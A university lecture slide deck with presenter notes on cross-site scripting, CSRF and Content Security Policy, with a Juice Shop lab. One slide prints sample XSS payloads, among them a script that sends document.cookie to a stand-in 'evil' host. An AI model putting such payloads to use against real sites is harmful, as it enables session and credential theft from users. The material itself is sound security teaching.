---
marp: true
theme: default
paginate: true
header: "Software Security · Week 5"
---

# Week 5
## XSS & Client-Side Risks
Software Security · Nutthakorn Chalaemwongwan

<!-- Hook: pop an alert(1) on a real site clone, then show the same payload exfiltrating a cookie. "XSS is injection that runs in YOUR browser, as the site you trust." ~2 min. -->

---

## Today

- The browser security model
- XSS: reflected / stored / DOM
- CSRF + SameSite cookies
- Content Security Policy (CSP)
- 🎮 Game: **XSS Golf**

<!-- Roadmap, 1 min. Frame: last week injection hit the server (SQL); this week it hits the client (the DOM). Same root cause, different interpreter (the browser). -->

---

## Recap — Week 4

- Injection = data interpreted as code
- Parameterized queries fix SQLi
- Same idea returns today — in the browser

<!-- 1-min bridge. The interpreter today is the browser's HTML/JS parser. Ask: "what was the one fix for SQLi?" then say: the XSS analogue is context-aware output encoding. -->

---

## Browser security model

- **Same-Origin Policy (SOP):** scripts only read data from same origin
- Origin = scheme + host + port
- Cookies, DOM, storage scoped per origin

<!-- Foundational — XSS is dangerous precisely because injected script runs INSIDE the origin, so SOP protects the attacker's code, not you. Give an origin example: https://a.com:443 vs http://a.com differ. ~5 min. -->

---

## XSS = injection into the page

> Attacker JavaScript runs in the victim's browser, in the site's origin.

- Steal cookies/sessions, keylog, rewrite the page, pivot
- Maps to **OWASP A05:2025 Injection** (output side)

<!-- Drive home: because the script runs as the site, it can do anything the user can. List concrete harms. "Output side" = the bug is in how we render data, not how we store it. ~4 min. -->

---

## Three flavors of XSS

| Type | Where the payload lives |
|---|---|
| **Reflected** | in the request, echoed back |
| **Stored** | saved server-side, served to others |
| **DOM** | client-side JS writes untrusted data to the DOM |

<!-- Go row by row with an example each: reflected = malicious link; stored = a comment that attacks every viewer (worst); DOM = `location.hash` written to innerHTML. Ask which is most dangerous and why (stored — hits everyone). ~6 min. -->

---

## Example payloads

```html
<script>fetch('//evil/'+document.cookie)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

- Context matters: HTML body vs attribute vs JS vs URL

<!-- These are the XSS Golf payloads. Explain why `<img onerror>` works when `<script>` is filtered, and why `">` breaks out of an attribute first. The context point is the key learning — the same data needs different encoding in each place. ~6 min. -->

---

## CSRF — riding the user's session

- Browser auto-sends cookies → attacker forges a state-changing request
- Defenses: **anti-CSRF tokens**, **SameSite** cookies, check Origin/Referer

<!-- Contrast with XSS: CSRF needs no script on the page — it abuses the browser auto-attaching cookies. Example: a hidden form that POSTs a transfer. SameSite cookies break the auto-send. ~5 min. -->

---

## Real-world: British Airways (2018)

- Attackers injected malicious JS (Magecart) into BA's site/app
- Script **skimmed credit-card details** as users typed
- 400,000 customers affected; £183M ICO fine (later reduced)

> Client-side injection = real money + real fines.

<!-- Make it real. Magecart = the keylogging harm from 2 slides ago, at scale, on a Fortune-500 checkout. Note it often enters via a compromised third-party script — which motivates CSP next. ~3 min. -->

---

## CWE mapping

- **CWE-79** — Cross-site scripting
- **CWE-352** — CSRF
- **CWE-1021** — improper restriction of rendered UI (clickjacking)

<!-- Quick reference for the worksheet. ~1 min. -->

---

## Defenses

- **Output encoding** per context (HTML/attr/JS/URL)
- Framework auto-escaping (don't bypass with `innerHTML`/`dangerouslySetInnerHTML`)
- **Content Security Policy** — block inline/3rd-party scripts
- `HttpOnly` + `SameSite` cookies; anti-CSRF tokens

<!-- The payoff. #1: encode for the OUTPUT CONTEXT (the bug is on output). Modern frameworks auto-escape — the danger is when devs opt out (innerHTML). CSP is defense-in-depth: even if a payload lands, the browser refuses to run it. ~6 min. -->

---

## ⛳ Game — XSS Golf

Craft the **shortest** payload that pops `alert(1)` / steals a cookie in Juice Shop.

- Leaderboard by character count
- **Round 2:** deploy a CSP + escaping that blocks *every* submitted payload
- Bonus: break a classmate's CSP

<!-- Explain before lab: golf = fewest characters → forces real understanding of contexts. Round 2 (defend) is the graded part. The "break a classmate's CSP" bonus teaches that CSP is hard to get right. ~3 min. -->

---

## Lab steps

1. Find reflected + stored + DOM XSS in Juice Shop
2. Demonstrate cookie theft (sandbox)
3. Add output encoding + a strict CSP header
4. Demonstrate CSRF and its defense

<!-- Logistics. Cookie theft must hit only the sandbox collector, not a real site (ethics). Step 3-4 (defend) are graded. Q6 of the quiz asks for their own scoring payload + the sink it hit. -->

---

## Deliverable

- Each XSS type with payload + context
- CSP + escaping that blocks them (show before/after)
- Short note: why SameSite + tokens stop CSRF
- **+ Audit the AI / EiPE / Prompt Problem** (see worksheet)

<!-- Before/after + the reasoning note. Remind the AI-resilient tasks count. -->

---

## Key takeaways

- XSS is injection on the output side — encode for the context
- CSP is defense-in-depth, not a substitute for encoding
- SameSite cookies kill most CSRF

<!-- Recap. Cold-call: "where is the XSS bug — input or output?" (output rendering). ~2 min. -->

---

# Questions?
Next week: Authentication, sessions & access control

<!-- Cliffhanger: "Next week — change one number in a URL and read someone else's data; forge a token and become admin." Remind Juice Shop ready. -->
